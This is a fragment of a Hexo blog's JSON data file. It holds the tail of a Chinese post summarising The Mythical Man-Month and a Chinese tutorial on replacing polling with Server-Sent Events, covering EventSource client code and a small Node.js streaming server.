准备对建议改进及坚持放弃</p><p>​ 听取开发人员在系统结构上的改进</p></li></ul><h3 id=\"系统的设计\"><a href=\"#系统的设计\" class=\"headerlink\" title=\"系统的设计\"></a>系统的设计</h3><ul><li><p>概念的完整性是重中之重</p></li><li><p>“功能与理解上的复杂程度比值才是系统设计最终目标”</p></li><li><p>将系统结构方面的工作与具体实现分离是获得概念完整性的最好方法</p></li><li><p>外部的体系结构规定实习上是增强小组的创造性</p></li><li><p>尽早交流和持续沟通能够使得结构师有较好的成本意识，是开发人员对设计有信心</p></li><li><p>第二个系统通常是人们所设计的最危险的系统，通常是过分的进行设计</p></li><li><p>为了概念完整性，设计必须又一个人或者具有共识的小型团队完成，设计结果必须由一个或者两个人来完成，以保证结果一致</p></li><li><p>必须明确定义系统结构中与先前定义不同的地方，重新定义详细程度应该与之前保持一致</p></li><li><p>出于精确性，需要形式化的定义，也需要一些记叙性的定义来加深理解</p></li><li><p>起初至少有两种以上的实现，定义会更加整洁和规范</p></li><li><p>结构师对实现人员的询问作出电话的解释和问答是非常重要的，必须进行日志整理和发布</p></li></ul><h3 id=\"项目成功的要点\"><a href=\"#项目成功的要点\" class=\"headerlink\" title=\"项目成功的要点\"></a>项目成功的要点</h3><h4 id=\"交流\"><a href=\"#交流\" class=\"headerlink\" title=\"交流\"></a>交流</h4><ul><li>因为团队之间不知道在做什么，从而出现进度灾难、功能不合理和系统缺陷。由于存在对他人进度的各种假设，团队之间成员开始理解出现偏差</li><li>团队应该以尽可能多的方式进行相互之间的交流，非正式的进行简要技术趁熟的常规会议项目，共享的正式项目工作手册【以及电子邮件】</li></ul><h4 id=\"项目工作手册\"><a href=\"#项目工作手册\" class=\"headerlink\" title=\"项目工作手册\"></a>项目工作手册</h4><p>​ ——是对项目必须产生一系列文档进行的一种组织结构</p><ul><li>项目所有文档都是工作手册的一部分</li><li>需要尽早仔细的设计工作手册结构</li><li>项目成员应该只能看到自己需要的部分，没有人需要或者看到其他部分结构，只需要了解接口</li><li>及时跟新十分重要</li></ul><h4 id=\"组织架构\"><a href=\"#组织架构\" class=\"headerlink\" title=\"组织架构\"></a>组织架构</h4><ul><li><p>团队的目标是为了减少必要的交流和协作量</p></li><li><p>为了减少交流，组织结构包括了人力划分及限定职责范围</p></li><li><p>组织交流应该是网状的，而不是树状的</p></li><li><p>每个子产品应该具有两个领导角色——产品负责人，技术主管（结构师）</p><p>​ —— 产品负责人和技术主管可以是同一个人</p><p>​ —— 产品经理为总指挥，技术主管左右手</p><p>​ —— 技术主管为总指挥，产品经理左右手</p></li></ul><h4 id=\"未雨绸缪\"><a href=\"#未雨绸缪\" class=\"headerlink\" title=\"未雨绸缪\"></a>未雨绸缪</h4><ul><li>软件工程师在着手发布产品之前，应该进行试验性系统的现场测试</li><li>第一个开发的系统对于大多数项目可能并不太合用，太多问题，系统的丢弃和重新设计可以一步完成也可以一步步完成，但这是必须完成的步骤</li><li>为舍弃而计划，这是无论如何要做的一个步</li><li>用户的实际需要会随着程序的构件、测试和使用而变化</li><li>由于软件产品易于掌握的特性和不可见性，导致构件人员面临着永恒的需求变更</li><li>灵活的组织架构对于软件开发是一个长期有效的解决方案</li><li>为变更组建团队比为变更进行设计更加困难</li><li>每次修复之后应该重新编译一边系统，确保系统不会因为隐蔽的方式破坏</li><li>所有修改都倾向于破坏系统的架构，增加了系统的混乱程度，以至于系统退化到必须重新设计</li><li>一次分给某个小组连续的目标时间块被证明是最好的安排方法</li></ul><h4 id=\"项目相关知识点\"><a href=\"#项目相关知识点\" class=\"headerlink\" title=\"项目相关知识点\"></a>项目相关知识点</h4><ul><li>仅仅通过对编码的部分时间估计，然后乘以其他部分相对系数，是无法得出整个工作精度估计的</li><li>构件独立小型程序数据并不适应与编程系统项目</li><li>程序开发随程序规模的增大而增长</li><li>一些研究报告表明时间指数大约在1.5倍预计时间</li><li>相对于其他活动，全职程序员50%时间在用于编程和调试</li><li>对于广泛使用的产品，其维护总成本通常是开发成本的40%或更多</li><li>用户越多，维护成本越多</li><li>缺陷修复总会以20%～50%的几率引入新的bug</li><li>大部分系统调试在夜间进行</li><li>测试数据应该有一部分校验数据，一部分边界数据，一部分无效数据</li></ul><h3 id=\"项目的文档\"><a href=\"#项目的文档\" class=\"headerlink\" title=\"项目的文档\"></a>项目的文档</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">—— 应当包括：</span><br><span class=\"line\"></span><br><span class=\"line\">\t 目的：功能是什么，开发原因是什么</span><br><span class=\"line\">\t 环境：运行在怎样的机器</span><br><span class=\"line\">\t 范围：有效输入范围，允许显示格式</span><br><span class=\"line\">\t 实现功能和使用算法：精确阐述它做什么</span><br><span class=\"line\">\t 输入——输出格式：必须确切完整</span><br><span class=\"line\">\t 操作指令：包括控制台输出正确及异常内容</span><br><span class=\"line\">\t 选项：用户功能有哪些，应该怎样进行挑选</span><br><span class=\"line\">\t 运行时间：特定运行时间</span><br><span class=\"line\">\t 精度和校验：期望精度和如何进行精度检测</span><br></pre></td></tr></table></figure><ul><li>软件开发关键文档应该包括：目标，用户手册，内部文档，进度，预算，组织机构图和工作空间分配</li><li>项目经理应该在项目早期对项目一系列文档进行规范化</li><li>对每个关键文档的维护提供状态监督及预警机制</li><li>每个文档本身就可以作为检查列表或者数据库</li><li>项目经理的主要日常工作是沟通，而不是作出决定；文档使个项目计划和决策在整个团队范围内得到交流</li><li>即使是完全开发给自己的程序，描述性的文字也是必须的，因为会被遗忘</li><li>文档能在整个生命周期客服克服懒惰和进度压力起促进和激励作用</li><li>大多数文档缺少总结性的内容，必须放慢脚步，稳妥进行</li><li>为了使文档易于维护，将他们合并到源程序至关重要，而不是独立文档进行保存</li><li>程序修改人员所使用的文档之中，出了描述事情如何，还应该阐述为什么那样做，目的非常关键</li></ul><h3 id=\"项目的整体\"><a href=\"#项目的整体\" class=\"headerlink\" title=\"项目的整体\"></a>项目的整体</h3><h4 id=\"整体部分\"><a href=\"#整体部分\" class=\"headerlink\" title=\"整体部分\"></a>整体部分</h4><ul><li><p>详尽体系结构工作不但使产品更加易用，而且使开发更容易进行，bug更不容易产生</p></li><li><p>许许多多失败源于产品未精确定义的地方</p></li><li><p>编写代码之前，规格说明必须提交外部测试小组，以详细的检查说明项目完整性和明确性，否则开发人员会自行摸索</p></li><li><p>自上而下的设计方式更容易细化，从四个方面减少bug</p><p>—— 清晰结构</p><p>—— 模块分割</p><p>—— 细节的抑制</p><p>—— 测试</p></li><li><p>大量的辅助性测试代码是有必要的</p></li><li><p>必须有人对变更和版本进行控制和文档化</p></li><li><p>系统测试期间，一次只增加一个构件</p></li><li><p>有时必须回退，推翻顶层设计</p></li></ul><h4 id=\"祸起萧墙\"><a href=\"#祸起萧墙\" class=\"headerlink\" title=\"祸起萧墙\"></a>祸起萧墙</h4><ul><li>一天天的进度落后比重大灾难更难以识别</li><li>根据一个严格的进度表来控制大型项目，进度表由里程碑和日期组成</li><li>里程碑必须是具体的特定的和可度量的事件进行清晰定义</li><li>项目没两周进行仔细修订的活动时间估计，随着开始事件到临近结束不会有太大变化，否则过高或过低的估计在项目结束前三周左右才会有所变化</li><li>如果错过了一个deadline 确保不会错过第二个deadline</li><li>必须有评审机制，使得所有成员可以通过它了解真正的状态，出于这个目的，里程碑的进度和完成文档是关键</li></ul><h3 id=\"软件工程中根本及次要问题\"><a href=\"#软件工程中根本及次要问题\" class=\"headerlink\" title=\"软件工程中根本及次要问题\"></a>软件工程中根本及次要问题</h3><h5 id=\"根本困难：\"><a href=\"#根本困难：\" class=\"headerlink\" title=\"根本困难：\"></a>根本困难：</h5><p><em>软件开发中最困难的部分是规格说明、设计和测试这些概念上的结构，而不是对概念进行表达和实现逼真程度进行验证</em></p><p>1、复杂度：由多方面形成，不仅仅是由于技术产生困难导致的管理问题，管理层面：全面理解问题变得困难-&gt;妨碍概念上的完整性-&gt;使所有离散出口难以寻找和控制-&gt;引起学习和理解上的负担</p><p>2、一致性：由于兼容等问题，导致一致性降低</p><p>3、可变性：由于平台变化，应用变化，用户等变化导致软件可变性</p><p>4、不可见性：由于软件是不存在具有空间的形体特征，所以很难关联和理解依赖</p><h5 id=\"解决的希望：\"><a href=\"#解决的希望：\" class=\"headerlink\" title=\"解决的希望：\"></a>解决的希望：</h5><p>1、OO编程：仅仅消除设计表达上的次要困难</p><p>2、人工智能、专家系统：接收数据，对系统推论，诊断及构件，建议接口规则，制定测试策略，记录各种bug产生及优化（目前尚未出现？</p><p>3、自动编程：通过较少的参数迅速描述特征，给定参数前提，制定清晰规则</p><p>4、图形化编程：存在变量范围嵌套，交叉引用等多方面问题</p><p>5、程序验证：进行技术规格测试</p><p>6、环境和工具：统一接口和通用工具，只是消除语法错误</p><p>7、工作站：强大的工作站并不能有魔术般的提高</p><h5 id=\"概念上根本解决方案：\"><a href=\"#概念上根本解决方案：\" class=\"headerlink\" title=\"概念上根本解决方案：\"></a>概念上根本解决方案：</h5><p>1、购买及自行开发</p><p>2、需求提炼和快速原型</p><p>3、卓越的设计人员</p>"},{"title":"使用 SSE 替代轮询","date":"2021-10-09T14:00:50.000Z","dir":"http","keywords":["Server-sent events","服务器发送事件"],"_content":"\n# 🎓 背景\n浏览器和服务端交互过程中，会有服务端向浏览器通信的场景。例如：服务端异步处理信息，处理成功后向浏览器推送。\n\n但并不是所有的后台服务都建立了 `websocket` 通道，因此常用做法是浏览器定时查询，`轮询`后台数据。\n\n从请求的角度来看，`轮询`多余了浏览器向后台服务`发起握手`、`\b发送数据包`的过程，因此并不简洁、优雅。\n\n那有没有既不需要 `websocket` 通道，又不用`轮询`这么 “low” 的方法呢？本文介绍的 `SSE` (server-site events) 就足够简洁和优雅。\n\n# 🤔️ SSE 是啥\n\n`SSE` 全称是 Server-sent events(服务器发送事件)，是服务器向客户端推送数据的一种方式。\n\n`SSE` 的本质是通过 `HTTP` 请求，不断发送 `流信息(streaming)`，使得服务器向客户端推送信息。类似于视频流。\n\n他不是一次性的数据包，而是会一直等着服务端的推送。因此客户端不会关闭连接，等着服务端的不断推送。这样就实现了服务端向客户端的推送。\n\n# 🆚 SSE VS Websocket\n`Websocket` 是双向通信(全双工)，浏览器 <-> 服务端相互通信，更强大也更灵活。\n\n`SSE` 是单向通信(半双工)，浏览器 <- 服务端，本质是下载信息。\n\n| 对比   | 优点 | 缺点 |\n| ---- | ----  | ---- |\n| `Websocket`  | 1. 全双工，功能更强大<br/> | 1.较为复杂，服务端需要重新支持<br/>2.断线重连需要额外部署 |\n| `SSE`  | 1.协议轻量，支持 HTTP 的服务端就支持<br/>2.方便默认支持断线重连<br/>3.支持自定义数据类型 | 1.半双工，不够灵活 |\n\n两者各有特点，适合不同场所\n\n# 💡 SSE 的使用\n既然 `SSE` 作用于客户端和服务端，下面分为`客户端`和`服务端`来分别介绍 `API`。\n\n## 浏览器的使用\n\n### 检查是否可以使用\n`SSE` 在浏览器中的API在 `EventSource` 对象上。通过这样来检测是否可以使用，通常来讲，除了 IE\\Edge，主流浏览器都支持：\n```js\nif (Boolean(window.EventSource)) {\n  // ...\n}\n```\n\n### 和服务器建立连接\n浏览器先生成 `EventSource` 实例，再向服务器发起连接。\n\n当然，url 可以是当前网址同域，也可以跨域。\n```js\n// 同网址\nlet source = new EventSource(url);\n\n// 跨域带上 cookie。 打开withCredentials属性，表示是否一起发送 Cookie。\nlet source = new EventSource(url, { withCredentials: true });\n```\n\n### 状态变化\n`EventSource` 实例中 `readyState` 属性表明了当前连接状态。可以取以下值。\n\n| 取值 | 解释 |\n| --- | --- |\n| `0` | 表示连接还未建立，或者断线正在重连 |\n| `1` | 表示连接已经建立，可以接受数据 |\n| `2` | 表示连接已断，且不会重连 |\n\n### 基本使用\n- `建立连接时`，会触发 `open` 事件，和 `js` 其他事件用法基本一致\n```js\n// onopen 写法\nsource.onopen = (event) => {\n    // ...\n}\n\n// addEventListener\nsource.addEventListener('open', (event) => {\n  // ...\n}, false);\n```\n\n- `收到消息时`，会触发 `message` 事件，和 `js` 其他事件用法基本一致。\n```js\n// onmessage 写法\nsource.onmessage = (event) => {\n  const data = event.data;\n  // ...\n};\n\n// addEventListener\nsource.addEventListener('message', (event) => {\n  // data 是服务器回传的数据，是 文本格式，二进制需要重新转码\n  const data = event.data;\n  // ...\n}, false);\n```\n\n- `发生错误时`(例如中断)，会触发 `error` 事件，和 `js` 其他事件用法基本一致。\n```js\n// onerror 写法\nsource.onerror = (event) => {\n  // ...\n};\n\n// addEventListener\nsource.addEventListener('error', (event) => {\n  // ...\n}, false);\n```\n\n- `关闭连接`\n```js\nsource.close();\n```\n\n- `自定义事件`, 默认情况下触发的是 `message` 事件，但是还能自定义事件，从而不触发 `message` 事件。本例子对 `info` 事件进行监听\n```js\nsource.addEventListener('info', (event) => {\n  const data = event.data;\n  // ...\n}, false);\n```\n\n## 服务端的使用\n### 请求头\n服务端的向浏览器发送的数据是 `UTF-8` 的编码文本，`HTTP` 头具有特定的信息。\n必须指定 `Content-Type` 类型为 `event-steam`。\n```\nContent-Type: text/event-stream\nCache-Control: no-cache\nConnection: keep-alive\n```\n![header](sse-header.png)\n\n\n### 数据格式\n每一次发送的信息，由若干个 `message` 组成，每个 `message` 之间用\\n\\n分隔。类型如下:\n```js\n// 数据栏\ndata: [value]\\n\n\n// 自定义信息类型\nevent: [value]\\n\n\n// 数据标识符\nid: [value]\\n\n\n// 最大间隔时间\nretry: [value]\\n\n\n// 注释\n: [value]\\n\n\n```\n\n| 对比   | 描述 | 例子 |\n| ---- | ----  | ---- |\n| `data`  | 数据内容用data表示，可以占用一行或多行，以“\\n\\n”结尾 | data: begin message\\n<br/>data: continue message\\n\\n |\n| `event`  | event头信息表示自定义的数据类型，没有则默认 `message` 事件 | event: foo\\n<br/>data: a foo event\\n\\n |\n| `id`  | 数据标识符用id表示，相当于每一条数据的编号 | id: msg1\\n <br/> data: message\\n\\n |\n| `retry`  | 浏览器默认三秒内没有发送任何信息开始重连。服务器端可以用 `retry` 头信息，指定通信的最大间隔时间| retry: 10000\\n |\n| ` `  | 通常，服务器每隔一段时间就会向浏览器发送一个注释保持连接不中断 | : This is a comment |\n\n## 服务端实现\n每个服务端实现不同，以下是 `NodeJS` 方案实现。\n\n### NodeJS 实现\n```js\n// sse.js\nconst http = require(\"http\");const http = require(\"http\");\n\nhttp.createServer(function (req, res) {\n  res.writeHead(200, {\n    \"Content-Type\": \"text/event-stream\",\n    \"Cache-Control\": \"no-cache\",\n    \"Connection\": \"keep-alive\",\n    \"Access-Control-Allow-Origin\": '*',\n  });\n\n  res.write(\"retry: 1000\\n\");\n  res.write(\"event: connecttime\\n\");\n  res.write(\"data: \" + (new Date()) + \"\\n\\n\");\n\n  interval = setInterval(function () {\n    res.write(\"data: \" + (new Date()) + \"\\n\\n\");\n  }, 1000);\n\n  req.addListener(\"close\", function () {\n    clearInterval(interval);\n  }, false);\n}).listen(8080);\n```\n\n### 启动和访问\n仅需 `node sse.js` 即可打开\n\n```bash\nnode sse.js\n```\n\n并访问 [http://127.0.0.1:8080/](http://127.0.0.1:8080/) 就能访问到 `sse` 的页面啦！\n\n# 🔚 结语\n从 `轮询` 到 `SSE`，再到 `SSE` 和 `Websocket` 的技术选型，不同的场景用不同方案。在鱼和熊掌都要兼得的道路上，道阻且长。\n\n开发过程和成长过程一样。先是“长大”就行，再到“快点长大”，最后是“好好长大”。开发过程也是一样，字符串替换“长大” 成 “迭代”。这个过程必不可少，经历也完全不同。\n\n希望能给你带来些帮助，感谢你的时间阅读到这里💗。","source":"_posts/what-is-sse.md","raw":"---\ntitle: 使用 SSE 替代轮询\ndate: 2021-10-09 22:00:50\ntags:\n    - javascript\n    - nodejs\n    - http\ndir: http\nkeywords:\n    - Server-sent events\n    - 服务器发送事件\n---\n\n# 🎓 背景\n浏览器和服务端交互过程中，会有服务端向浏览器通信的场景。例如：服务端异步处理信息，处理成功后向浏览器推送。\n\n但并不是所有的后台服务都建立了 `websocket` 通道，因此常用做法是浏览器定时查询，`轮询`后台数据。\n\n从请求的角度来看，`轮询`多余了浏览器向后台服务`发起握手`、`\b发送数据包`的过程，因此并不简洁、优雅。\n\n那有没有既不需要 `websocket` 通道，又不用`轮询`这么 “low” 的方法呢？本文介绍的 `SSE` (server-site events) 就足够简洁和优雅。\n\n# 🤔️ SSE 是啥\n\n`SSE` 全称是 Server-sent events(服务器发送事件)，是服务器向客户端推送数据的一种方式。\n\n`SSE` 的本质是通过 `HTTP` 请求，不断发送 `流信息(streaming)`，使得服务器向客户端推送信息。类似于视频流。\n\n他不是一次性的数据包，而是会一直等着服务端的推送。因此客户端不会关闭连接，等着服务端的不断推送。这样就实现了服务端向客户端的推送。\n\n# 🆚 SSE VS Websocket\n`Websocket` 是双向通信(全双工)，浏览器 <-> 服务端相互通信，更强大也更灵活。\n\n`SSE` 是单向通信(半双工)，浏览器 <- 服务端，本质是下载信息。\n\n| 对比   | 优点 | 缺点 |\n| ---- | ----  | ---- |\n| `Websocket`  | 1. 全双工，功能更强大<br/> | 1.较为复杂，服务端需要重新支持<br/>2.断线重连需要额外部署 |\n| `SSE`  | 1.协议轻量，支持 HTTP 的服务端就支持<br/>2.方便默认支持断线重连<br/>3.支持自定义数据类型 | 1.半双工，不够灵活 |\n\n两者各有特点，适合不同场所\n\n# 💡 SSE 的使用\n既然 `SSE` 作用于客户端和服务端，下面分为`客户端`和`服务端`来分别介绍 `API`。\n\n## 浏览器的使用\n\n### 检查是否可以使用\n`SSE` 在浏览器中的API在 `EventSource` 对象上。通过这样来检测是否可以使用，通常来讲，除了 IE\\Edge，主流浏览器都支持：\n```js\nif (Boolean(window.EventSource)) {\n  // ...\n}\n```\n\n### 和服务器建立连接\n浏览器先生成 `EventSource` 实例，再向服务器发起连接。\n\n当然，url 可以是当前网址同域，也可以跨域。\n```js\n// 同网址\nlet source = new EventSource(url);\n\n// 跨域带上 cookie。 打开withCredentials属性，表示是否一起发送 Cookie。\nlet source = new EventSource(url, { withCredentials: true });\n```\n\n### 状态变化\n`EventSource` 实例中 `readyState` 属性表明了当前连接状态。可以取以下值。\n\n| 取值 | 解释 |\n| --- | --- |\n| `0` | 表示连接还未建立，或者断线正在重连 |\n| `1` | 表示连接已经建立，可以接受数据 |\n| `2` | 表示连接已断，且不会重连 |\n\n### 基本使用\n- `建立连接时`，会触发 `open` 事件，和 `js` 其他事件用法基本一致\n```js\n// onopen 写法\nsource.onopen = (event) => {\n    // ...\n}\n\n// addEventListener\nsource.addEventListener('open', (event) => {\n  // ...\n}, false);\n```\n\n- `收到消息时`，会触发 `message` 事件，和 `js` 其他事件用法基本一致。\n```js\n// onmessage 写法\nsource.onmessage = (event) => {\n  const data = event.data;\n  // ...\n};\n\n// addEventListener\nsource.addEventListener('message', (event) => {\n  // data 是服务器回传的数据，是 文本格式，二进制需要重新转码\n  const data = event.data;\n  // ...\n}, false);\n```\n\n- `发生错误时`(例如中断)，会触发 `error` 事件，和 `js` 其他事件用法基本一致。\n```js\n// onerror 写法\nsource.onerror = (event) => {\n  // ...\n};\n\n// addEventListener\nsource.addEventListener('error', (event) => {\n  // ...\n}, false);\n```\n\n- `关闭连接`\n```js\nsource.close();\n```\n\n- `自定义事件`, 默认情况下触发的是 `message` 事件，但是还能自定义事件，从而不触发 `message` 事件。本例子对 `info` 事件进行监听\n```js\nsource.addEventListener('info', (event) => {\n  const data = event.data;\n  // ...\n}, false);\n```\n\n## 服务端的使用\n### 请求头\n服务端的向浏览器发送的数据是 `UTF-8` 的编码文本，`HTTP` 头具有特定的信息。\n必须指定 `Content-Type` 类型为 `event-steam`。\n```\nContent-Type: text/event-stream\nCache-Control: no-cache\nConnection: keep-alive\n```\n![header](sse-header.png)\n\n\n### 数据格式\n每一次发送的信息，由若干个 `message` 组成，每个 `message` 之间用\\n\\n分隔。类型如下:\n```js\n// 数据栏\ndata: [value]\\n\n\n// 自定义信息类型\nevent: [value]\\n\n\n// 数据标识符\nid: [value]\\n\n\n// 最大间隔时间\nretry: [value]\\n\n\n// 注释\n: [value]\\n\n\n```\n\n| 对比   | 描述 | 例子 |\n| ---- | ----  | ---- |\n| `data`  | 数据内容用data表示，可以占用一行或多行，以“\\n\\n”结尾 | data: begin message\\n<br/>data: continue message\\n\\n |\n| `event`  | event头信息表示自定义的数据类型，没有则默认 `message` 事件 | event: foo\\n<br/>data: a foo event\\n\\n |\n| `id`  | 数据标识符用id表示，相当于每一条数据的编号 | id: msg1\\n <br/> data: message\\n\\n |\n| `retry`  | 浏览器默认三秒内没有发送任何信息开始重连。服务器端可以用 `retry` 头信息，指定通信的最大间隔时间| retry: 10000\\n |\n| ` `  | 通常，服务器每隔一段时间就会向浏览器发送一个注释保持连接不中断 | : This is a comment |\n\n## 服务端实现\n每个服务端实现不同，以下是 `NodeJS` 方案实现。\n\n### NodeJS 实现\n```js\n// sse.js\nconst http = require(\"http\");const http = require(\"http\");\n\nhttp.createServer(function (req, res) {\n  res.writeHead(200, {\n    \"Content-Type\": \"text/event-stream\",\n    \"Cache-Control\": \"no-cache\",\n    \"Connection\": \"keep-alive\",\n    \"Access-Control-Allow-Origin\": '*',\n  });\n\n  res.write(\"retry: 1000\\n\");\n  res.write(\"event: connecttime\\n\");\n  res.write(\"data: \" + (new Date()) + \"\\n\\n\");\n\n  interval = setInterval(function () {\n    res.write(\"data: \" + (new Date()) + \"\\n\\n\");\n  }, 1000);\n\n  req.addListener(\"close\", function () {\n    clearInterval(interval);\n  }, false);\n}).listen(8080);\n```\n\n### 启动和访问\n仅需 `node sse.js` 即可打开\n\n```bash\nnode sse.js\n```\n\n并访问 [http://127.0.0.1:8080/](http://127.0.0.1:8080/) 就能访问到 `sse` 的页面啦！\n\n# 🔚 结语\n从 `轮询` 到 `SSE`，再到 `SSE` 和 `Websocket` 的技术选型，不同的场景用不同方案。在鱼和熊掌都要兼得的道路上，道阻且长。\n\n开发过程和成长过程一样。先是“长大”就行，再到“快点长大”，最后是“好好长大”。开发过程也是一样，字符串替换“长大” 成 “迭代”。这个过程必不可少，经历也完全不同。\n\n希望能给你带来些帮助，感谢你的时间阅读到这里💗。","slug":"what-is-sse","published":1,"updated":"2021-10-13T15:47:53.471Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0a001g4jzxbh17edrw","content":"<h1 id=\"🎓-背景\"><a href=\"#🎓-背景\" class=\"headerlink\" title=\"🎓 背景\"></a>🎓 背景</h1><p>浏览器和服务端交互过程中，会有服务端向浏览器通信的场景。例如：服务端异步处理信息，处理成功后向浏览器推送。</p><p>但并不是所有的后台服务都建立了 <code>websocket</code> 通道，因此常用做法是浏览器定时查询，<code>轮询</code>后台数据。</p><p>从请求的角度来看，<code>轮询</code>多余了浏览器向后台服务<code>发起握手</code>、<code>\b发送数据包</code>的过程，因此并不简洁、优雅。</p><p>那有没有既不需要 <code>websocket</code> 通道，又不用<code>轮询</code>这么 “low” 的方法呢？本文介绍的 <code>SSE</code> (server-site events) 就足够简洁和优雅。</p><h1 id=\"🤔️-SSE-是啥\"><a href=\"#🤔️-SSE-是啥\" class=\"headerlink\" title=\"🤔️ SSE 是啥\"></a>🤔️ SSE 是啥</h1><p><code>SSE</code> 全称是 Server-sent events(服务器发送事件)，是服务器向客户端推送数据的一种方式。</p><p><code>SSE</code> 的本质是通过 <code>HTTP</code> 请求，不断发送 <code>流信息(streaming)</code>，使得服务器向客户端推送信息。类似于视频流。</p><p>他不是一次性的数据包，而是会一直等着服务端的推送。因此客户端不会关闭连接，等着服务端的不断推送。这样就实现了服务端向客户端的推送。</p><h1 id=\"🆚-SSE-VS-Websocket\"><a href=\"#🆚-SSE-VS-Websocket\" class=\"headerlink\" title=\"🆚 SSE VS Websocket\"></a>🆚 SSE VS Websocket</h1><p><code>Websocket</code> 是双向通信(全双工)，浏览器 <-> 服务端相互通信，更强大也更灵活。</-></p><p><code>SSE</code> 是单向通信(半双工)，浏览器 &lt;- 服务端，本质是下载信息。</p><table><thead><tr><th>对比</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td><code>Websocket</code></td><td>1. 全双工，功能更强大<br></td><td>1.较为复杂，服务端需要重新支持<br>2.断线重连需要额外部署</td></tr><tr><td><code>SSE</code></td><td>1.协议轻量，支持 HTTP 的服务端就支持<br>2.方便默认支持断线重连<br>3.支持自定义数据类型</td><td>1.半双工，不够灵活</td></tr></tbody></table><p>两者各有特点，适合不同场所</p><h1 id=\"💡-SSE-的使用\"><a href=\"#💡-SSE-的使用\" class=\"headerlink\" title=\"💡 SSE 的使用\"></a>💡 SSE 的使用</h1><p>既然 <code>SSE</code> 作用于客户端和服务端，下面分为<code>客户端</code>和<code>服务端</code>来分别介绍 <code>API</code>。</p><h2 id=\"浏览器的使用\"><a href=\"#浏览器的使用\" class=\"headerlink\" title=\"浏览器的使用\"></a>浏览器的使用</h2><h3 id=\"检查是否可以使用\"><a href=\"#检查是否可以使用\" class=\"headerlink\" title=\"检查是否可以使用\"></a>检查是否可以使用</h3><p><code>SSE</code> 在浏览器中的API在 <code>EventSource</code> 对象上。通过这样来检测是否可以使用，通常来讲，除了 IE\\Edge，主流浏览器都支持：<br></p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">Boolean</span>(<span class=\"built_in\">window</span>.EventSource)) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h3 id=\"和服务器建立连接\"><a href=\"#和服务器建立连接\" class=\"headerlink\" title=\"和服务器建立连接\"></a>和服务器建立连接</h3><p>浏览器先生成 <code>EventSource</code> 实例，再向服务器发起连接。</p><p>当然，url 可以是当前网址同域，也可以跨域。<br></p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 同网址</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> source = <span class=\"keyword\">new</span> EventSource(url);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 跨域带上 cookie。 打开withCredentials属性，表示是否一起发送 Cookie。</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> source = <span class=\"keyword\">new</span> EventSource(url, &#123; <span class=\"attr\">withCredentials</span>: <span class=\"literal\">true</span> &#125;);</span><br></pre></td></tr></table></figure><p></p><h3 id=\"状态变化\"><a href=\"#状态变化\" class=\"headerlink\" title=\"状态变化\"></a>状态变化</h3><p><code>EventSource</code> 实例中 <code>readyState</code> 属性表明了当前连接状态。可以取以下值。</p><table><thead><tr><th>取值</th><th>解释</th></tr></thead><tbody><tr><td><code>0</code></td><td>表示连接还未建立，或者断线正在重连</td></tr><tr><td><code>1</code></td><td>表示连接已经建立，可以接受数据</td></tr><tr><td><code>2</code></td><td>表示连接已断，且不会重连</td></tr></tbody></table><h3 id=\"基本使用\"><a href=\"#基本使用\" class=\"headerlink\" title=\"基本使用\"></a>基本使用</h3><ul><li><p><code>建立连接时</code>，会触发 <code>open</code> 事件，和 <code>js</code> 其他事件用法基本一致</p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// onopen 写法</span></span><br><span class=\"line\">source.onopen = <span class=\"function\">(<span class=\"params\">event</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// addEventListener</span></span><br><span class=\"line\">source.addEventListener(<span class=\"string\">'open'</span>, (event) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;, <span class=\"literal\">false</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>收到消息时</code>，会触发 <code>message</code> 事件，和 <code>js</code> 其他事件用法基本一致。</p><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// onmessage 写法</span></span><br><span class=\"line\">source.onmessage = <span class=\"function\">(<span class=\"params\">event</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> data = event.data;</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// addEventListener</span></span><br><span class=\"line\">source.addEventListener(<span class=\"string\">'message'</span>, (event) =&gt; &#123;</span><br><span class=\"line\">  <span 